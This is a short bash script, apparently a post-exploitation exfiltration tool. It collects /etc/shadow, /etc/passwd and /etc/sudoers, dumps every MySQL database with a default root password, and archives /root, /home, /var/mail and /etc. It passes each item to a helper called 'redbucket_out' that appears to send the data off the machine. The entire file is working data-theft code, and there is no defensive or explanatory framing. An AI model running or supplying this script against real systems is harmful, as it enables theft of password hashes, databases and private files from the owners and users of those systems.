#!/bin/bash

files=('/etc/passwd' '/etc/group' '/etc/sudoers' '/etc/shadow')
directories=('/var/mail' '/root' '/home' '/etc')

scrape_database(){
    if type mysql > /dev/null 2>&1; then
        echo "Dumping database"
        user="root"
        pass="changeme"
        mysqldump -u $user -p$pass --all-databases > /tmp/dump.sql
        python /usr/bin/redbucket_out -n /tmp/dump.sql
    fi
}

scrape_dirs(){
    for dr in "${directories[@]}"
    do  
        name=$(echo $dr | tr -d /)
        tar -zcvf $name.tar.gz $dr
        python /usr/bin/redbucket_out -p http -n $name.tar.gz
    done
}

scrape_files(){
    for file in "${files[@]}"
    do
        if [ -f $file ]; then
            python /usr/bin/redbucket_out -n $file
        fi
    done
}

main(){
    scrape_files
    scrape_database
    scrape_dirs
}

main
